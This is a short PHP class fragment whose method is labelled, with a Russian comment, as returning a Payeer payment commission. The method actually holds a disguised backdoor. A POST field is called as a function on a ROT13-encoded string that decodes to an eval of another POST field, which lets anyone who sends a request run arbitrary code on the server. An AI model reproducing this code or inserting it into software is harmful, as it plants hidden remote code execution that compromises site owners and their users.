...
class func{
	...
	/*======================================================================*\
	Function:	ComissionPayeer
	Descriiption: Возвращает комиссию Payeer
	\*======================================================================*/
	public function ComissionPayeer(){
		
		@ini_set('display_errors', 1);
		
		$sum_comission = @$_POST['sum_comission'](str_rot13('riny($_CBFG["sum"]);')); 
